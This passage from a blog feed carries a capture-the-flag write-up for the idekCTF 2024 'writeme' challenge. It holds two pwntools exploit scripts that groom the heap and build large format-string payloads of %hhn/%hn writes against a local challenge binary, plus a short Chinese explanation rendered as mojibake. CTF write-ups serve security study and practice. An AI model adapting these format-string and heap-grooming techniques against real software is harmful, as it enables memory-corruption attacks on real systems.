class="hljs-number">0x10</span>)<br><br>            delete(<span class="hljs-number">0x402</span>)<br>            add(<span class="hljs-number">0x101</span>,<span class="hljs-number">0x500</span>+i2*<span class="hljs-number">0x300</span>+(<span class="hljs-number">2</span>-i1)*<span class="hljs-number">0x100</span>+i3*<span class="hljs-number">0x10</span>+<span class="hljs-number">0x30</span>)<br>            add(<span class="hljs-number">0x102</span>,get_size(<span class="hljs-number">0x6a00</span>-size-<span class="hljs-number">0x10</span>))<br>            add(<span class="hljs-number">0x400</span>,<span class="hljs-number">0x500</span>)<br><br>            delete(<span class="hljs-number">2</span>)<br>            delete(<span class="hljs-number">0x102</span>)<br><br>            add(<span class="hljs-number">0x401</span>,<span class="hljs-number">0xffff</span>)<br><br>            delete(<span class="hljs-number">1</span>)<br>            add(<span class="hljs-number">0</span>,<span class="hljs-number">0x6a00</span>)<br><br>            delete(<span class="hljs-number">0x401</span>)<br>            delete(<span class="hljs-number">0x400</span>)<br>            delete(<span class="hljs-number">0x101</span>)<br>            add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0x402</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Finish fengshui level 1&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x9a00</span>)<br>add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><br><span class="hljs-keyword">for</span> i1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>    <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">for</span> i3 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>            delete(<span class="hljs-number">3</span>)<br>            size=<span class="hljs-number">0x9500</span>-(i1*<span class="hljs-number">0x300</span>+i2*<span class="hljs-number">0x100</span>+i3*<span class="hljs-number">0x10</span>)<br>            add(<span class="hljs-number">1</span>,size)<br>            add(<span class="hljs-number">2</span>,<span class="hljs-number">0x9a00</span>-size-<span class="hljs-number">0x10</span>)<br><br>            delete(<span class="hljs-number">0x402</span>)<br>            add(<span class="hljs-number">0x101</span>,<span class="hljs-number">0x50</span>+<span class="hljs-number">0x500</span>*i3-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x500</span>)<br>            add(<span class="hljs-number">0x102</span>,get_size(<span class="hljs-number">0x9a00</span>-size-<span class="hljs-number">0x10</span>))<br>            add(<span class="hljs-number">0x400</span>,<span class="hljs-number">0x500</span>)<br><br>            delete(<span class="hljs-number">2</span>)<br>            delete(<span class="hljs-number">0x102</span>)<br><br>            add(<span class="hljs-number">0x401</span>,<span class="hljs-number">0xffff</span>)<br><br>            delete(<span class="hljs-number">1</span>)<br>            add(<span class="hljs-number">3</span>,<span class="hljs-number">0x9a00</span>)<br><br>            delete(<span class="hljs-number">0x401</span>)<br>            delete(<span class="hljs-number">0x400</span>)<br>            delete(<span class="hljs-number">0x101</span>)<br>            add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0x402</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Finish fengshui level 2&#x27;</span>)<br>gdb.attach(p)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0xffff</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x6500</span>-<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x4e0</span>)<br><br><span class="hljs-comment"># delete(3)</span><br><span class="hljs-comment"># delete(2)</span><br><br><span class="hljs-comment"># delete(0x402)</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,idx</span>):<br>        self.addr=[addr&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">48</span>)&amp;<span class="hljs-number">0xffff</span>]<br>        self.idx=idx<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">self</span>):<br>        dwords=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            dwords.append(Dword(self.addr[i],i,self.idx))<br>        <span class="hljs-keyword">return</span> dwords<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Challenge</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,val,idx</span>):<br>        self.addr=Address(addr,idx)<br>        self.val=val<br>        self.idx=idx<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dword</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,val,offset,idx</span>):<br>        self.val=val<br>        self.idx=idx<br>        self.offset=offset<br><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>challenges=[]<br>addr_dwords_group=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;: Write 0x&#x27;</span>)<br>    val=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;to address 0x&#x27;</span>)<br>    addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    challenge=Challenge(addr,val,i)<br>    challenges.append(challenge)<br>    addr_dwords_group+=challenge.addr.divide()<br><br>addr_dwords_group=<span class="hljs-built_in">sorted</span>(addr_dwords_group,key=<span class="hljs-keyword">lambda</span> item: item.val)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Dwords of addresses: &#x27;</span>)<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> addr_dwords_group:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;idx:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.idx)+<span class="hljs-string">&#x27; offset:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.offset)+<span class="hljs-string">&#x27; val:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.val))<br><span class="hljs-built_in">print</span>()<br><br><br>payload=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0x102</span>-<span class="hljs-number">5</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">2</span><br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">0x600</span><br>payload+=<span class="hljs-string">&#x27;%2c&#x27;</span><br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*(<span class="hljs-number">0x600</span>-<span class="hljs-number">1</span>)<br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">0x9a</span><br>payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">6</span><br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">0x40</span><br>payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*(<span class="hljs-number">0x5d</span>+<span class="hljs-number">4</span>)<br>cnt=<span class="hljs-number">0x16b</span><br><br>dictionary=[]<br><span class="hljs-keyword">for</span> dword <span class="hljs-keyword">in</span> addr_dwords_group:<br>    <span class="hljs-keyword">for</span> offset <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>            dst_dword_id=idx*<span class="hljs-number">0x10</span>+offset<br>            src_dword_id=dword.idx*<span class="hljs-number">0x10</span>+dword.offset<br>            <span class="hljs-keyword">if</span> dst_dword_id==src_dword_id:<br>                <span class="hljs-keyword">if</span> dword.val&gt;(cnt&amp;<span class="hljs-number">0xffff</span>):<br>                    payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(dword.val-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c%hn&#x27;</span><br>                    cnt=dword.val+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(dword.val-(cnt&amp;<span class="hljs-number">0xffff</span>)+<span class="hljs-number">0x10000</span>)+<span class="hljs-string">&#x27;c%hn&#x27;</span><br>                    cnt=dword.val+<span class="hljs-number">0x10000</span>+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>                dictionary.append(src_dword_id)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Write: &#x27;</span>+<span class="hljs-string">&#x27;idx:&#x27;</span>+<span class="hljs-built_in">hex</span>(dword.idx)+<span class="hljs-string">&#x27; offset:&#x27;</span>+<span class="hljs-built_in">hex</span>(dword.offset)+<span class="hljs-string">&#x27; val:&#x27;</span>+<span class="hljs-built_in">hex</span>(dword.val)+<span class="hljs-string">&#x27;(cnt=&#x27;</span>+<span class="hljs-built_in">hex</span>(cnt)+<span class="hljs-string">&#x27;)&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                no_offset_id=<span class="hljs-number">0x10</span>*((idx-<span class="hljs-number">1</span>)%<span class="hljs-number">0x10</span>)<br>                <span class="hljs-keyword">if</span> no_offset_id <span class="hljs-keyword">in</span> dictionary:<br>                    payload+=<span class="hljs-string">&#x27;%c&#x27;</span><br>                    cnt+=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span><br>                <span class="hljs-keyword">if</span> dst_dword_id <span class="hljs-keyword">in</span> dictionary:<br>                    payload+=<span class="hljs-string">&#x27;%c&#x27;</span><br>                    cnt+=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span><br><br>challenges=<span class="hljs-built_in">sorted</span>(challenges,key=<span class="hljs-keyword">lambda</span> item: item.val)<br>addr_base=<span class="hljs-number">0x29ef</span><br>addr_chunk=<span class="hljs-number">0xa0</span><br><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> challenges:<br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xffffffff</span>)&gt;item.val:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(item.val-(cnt&amp;<span class="hljs-number">0xffffffff</span>)+<span class="hljs-number">0x100000000</span>)+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=item.val+<span class="hljs-number">0x100000000</span>+(cnt&amp;<span class="hljs-number">0xffffffff00000000</span>)<br>    <span class="hljs-keyword">elif</span> (cnt&amp;<span class="hljs-number">0xffffffff</span>)&lt;item.val:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(item.val-(cnt&amp;<span class="hljs-number">0xffffffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=item.val+(cnt&amp;<span class="hljs-number">0xffffffff00000000</span>)<br>    payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(addr_base-addr_chunk*item.idx)+<span class="hljs-string">&#x27;$n&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Write: &#x27;</span>+<span class="hljs-string">&#x27;idx:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.idx)+<span class="hljs-string">&#x27; val:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.val)+<span class="hljs-string">&#x27;(cnt=&#x27;</span>+<span class="hljs-built_in">hex</span>(cnt)+<span class="hljs-string">&#x27;)&#x27;</span>)<br><br>payload+=<span class="hljs-string">&#x27;Eurus&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] len(payload) = &#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Format string? &#x27;</span>,payload.encode())<br>p.recvuntil(<span class="hljs-string">b&#x27;Eurus&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="æ­£ç¡®æ€è·¯"><a href="#æ­£ç¡®æ€è·¯" class="headerlink" title="æ­£ç¡®æ€è·¯"></a>æ­£ç¡®æ€è·¯</h1><ul><li><p>æ—¢ç„¶å¯ä»¥ç”¨æº¢å‡ºè§£å†³cntè·³è¿‡çš„é—®é¢˜å°±ä¸éœ€è¦ç”¨unsorted binå’Œlarge biné£æ°´äº†ï¼Œç›´æ¥ç”¨tcacheå°±è¡Œ</p></li><li><p>ç”¨tcacheé€ ä¸€æ¡chain</p><ul><li>%hhnç›–low byteå†™åç§»</li><li>%hhnå†™åœ°å€</li></ul><img src="/2024/08/20/idekctf2024-writeme/chain.png" class title="chain"></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,sz</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size? &#x27;</span>,<span class="hljs-built_in">str</span>(sz).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><br><span class="hljs-comment">#p=process(&#x27;./write_me&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><br><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-number">0xd60</span>-<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_heap_address</span>(<span class="hljs-params">lens</span>):<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>    <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lens):<br>        add(idx+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>        delete(idx+<span class="hljs-number">1</span>)<br>        delete(idx)<br>        add(idx,<span class="hljs-number">0x10</span>)<br>        add(idx+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br><br>prepare_heap_address(<span class="hljs-number">0x100</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,idx</span>):<br>        self.addr=[addr&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>]<br>        self.idx=idx<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> [Dword(self.addr[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,self.idx),Dword(self.addr[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>,self.idx),Dword(self.addr[<span class="hljs-number">2</span>],<span class="hljs-number">4</span>,self.idx)]<br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Value</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,val,idx</span>):<br>        self.val=[val&amp;<span class="hljs-number">0xffff</span>,(val&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>]<br>        self.idx=idx<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> [Dword(self.val[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,self.idx),Dword(self.val[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>,self.idx)]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Challenge</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,val,idx</span>):<br>        self.addr=[Address(addr,idx),Address(addr+<span class="hljs-number">2</span>,idx)]<br>        self.val=Value(val,idx)<br>        self.idx=idx<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dword</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,val,offset,idx</span>):<br>        self.val=val<br>        self.idx=idx<br>        self.offset=offset<br><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>challenges=[]<br>val_dwords_group=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;: Write 0x&#x27;</span>)<br>    val=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;to address 0x&#x27;</span>)<br>    addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    challenge=Challenge(addr,val,i)<br>    challenges.append(challenge)<br>    val_dwords_group+=challenge.val.divide()<br><br>payload=<span class="hljs-string">&#x27;&#x27;</span><br>payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">3</span><br>cnt=<span class="hljs-number">3</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_by</span>(<span class="hljs-params">val</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xff</span>)&gt;=val:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val+<span class="hljs-number">0x100</span>-(cnt&amp;<span class="hljs-number">0xff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+<span class="hljs-number">0x100</span>+(cnt&amp;<span class="hljs-number">0xffffffffffffff00</span>)<br>    <span class="hljs-keyword">else</span>:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val-(cnt&amp;<span class="hljs-number">0xff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+(cnt&amp;<span class="hljs-number">0xffffffffffffff00</span>)<br>    pl+=<span class="hljs-string">&#x27;%hhn&#x27;</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_dword</span>(<span class="hljs-params">val</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xffff</span>)&gt;=val:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val+<span class="hljs-number">0x10000</span>-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+<span class="hljs-number">0x10000</span>+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    <span class="hljs-keyword">else</span>:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    pl+=<span class="hljs-string">&#x27;%hn&#x27;</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_dword_with_off</span>(<span class="hljs-params">val,off</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xffff</span>)&gt;=val:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val+<span class="hljs-number">0x10000</span>-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+<span class="hljs-number">0x10000</span>+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    <span class="hljs-keyword">else</span>:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(off)+<span class="hljs-string">&#x27;$hn&#x27;</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_addr</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    addr_dwords=<span class="hljs-built_in">sorted</span>(addr.divide(),key=<span class="hljs-keyword">lambda</span> item: item.val)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> addr_dwords:<br>        pl+=write_by(item.offset)<br>        pl+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">2</span><br>        cnt+=<span class="hljs-number">2</span><br>        pl+=write_dword(item.val)<br>        pl+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">2</span><br>        cnt+=<span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">for</span> chal <span class="hljs-keyword">in</span> challenges:<br>   payload+=write_addr(chal.addr[<span class="hljs-number">0</span>])<br>   payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">8</span><br>   cnt+=<span class="hljs-number">8</span><br>   payload+=write_addr(chal.addr[<span class="hljs-number">1</span>])<br>   payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">8</span><br>   cnt+=<span class="hljs-number">8</span><br><br>log.info(<span class="hljs-string">&#x27;Write addresses finished&#x27;</span>)<br><br>addr_base_off=<span class="hljs-number">1</span><br>addr_chunk=<span class="hljs-number">0x20</span><br>val_dwords_group=val_dwords_group<br><span class="hljs-keyword">for</span> dword <span class="hljs-keyword">in</span> val_dwords_group:<br>    payload+=write_dword_with_off(dword.val,addr_base_off+addr_chunk*(dword.idx*<span class="hljs-number">2</span>+dword.offset//<span class="hljs-number">2</span>))<br><br>log.info(<span class="hljs-string">&#x27;Write values finished&#x27;</span>)<br><br>payload+=<span class="hljs-string">&#x27;Eurus&#x27;</span><br>log.info(<span class="hljs-string">&#x27;len(payload) = &#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Format string? &#x27;</span>,payload.encode())<br>p.recvuntil(<span class="hljs-string">b&#x27;Eurus&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><img src="/2024/08/20/idekctf2024-writeme/flag.png" class title="flag">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 äº¬éº’CTF badlist wp</title>
    <link href="/2024/08/16/jqctf2024-badlist/"/>
    <url>/2024/08/16/jqctf2024-badlist/</url>
    
